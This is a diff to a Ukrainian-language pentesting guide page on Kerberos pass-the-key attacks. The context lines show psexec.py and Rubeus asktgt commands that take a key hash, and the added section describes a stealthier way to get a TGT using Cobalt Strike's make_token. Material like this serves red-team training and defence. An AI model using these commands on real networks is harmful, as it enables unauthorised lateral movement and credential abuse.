@@ -30,7 +30,15 @@ python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
 ```bash
 .\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
 ```
-## Посилання
+## Stealthier version
+
+> [!WARNING]
+> Кожна сесія входу може мати лише один активний TGT одночасно, тому будьте обережні.
+
+1. Створіть нову сесію входу з **`make_token`** з Cobalt Strike.
+2. Потім використовуйте Rubeus для генерації TGT для нової сесії входу, не впливаючи на існуючу.
+
+## References
 
 - [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
 
